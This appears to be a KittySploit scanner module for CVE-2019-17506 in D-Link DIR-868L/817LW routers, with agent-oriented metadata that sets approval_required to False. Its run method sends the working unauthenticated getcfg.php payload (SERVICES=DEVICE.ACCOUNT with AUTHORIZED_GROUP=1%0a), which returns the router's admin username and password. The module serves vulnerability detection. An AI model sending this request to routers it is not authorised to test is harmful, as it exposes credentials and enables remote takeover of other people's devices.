#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DIR-868L B1-2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link DIR-868L/817LW - Information Disclosure Detection',
        'description': "D-Link DIR-868L B1-2.03 and DIR-817LW A1-1.04 routers are vulnerable to information disclosure vulnerabilities because certain web interfaces do not require authentication. An attacker can get the router's username and password (and other information) via a DEVICE.ACCOUNT value for SERVICES in conjunction with AUTHORIZED_GROUP=1%0a to getcfg.php. This could be used to control the router remotely.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'dlink', 'router', 'disclosure', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/dahua966/Routers-vuls/blob/master/DIR-868/name%26passwd.py',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-17506',
            'https://github.com/openx-org/BLEN',
            'https://github.com/SexyBeast233/SecBooks',
        ],
        'cve': 'CVE-2019-17506',
    }

    def run(self):
        path = '/getcfg.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'text/xml'}, data='SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('</password>', 'DEVICE.ACCOUNT',)
        if all(m in body for m in body_all):
            self.set_info(
                severity='critical',
                reason='D-Link DIR-868L/817LW - Information Disclosure detected',
                path=path,
            )
            return True
        return False

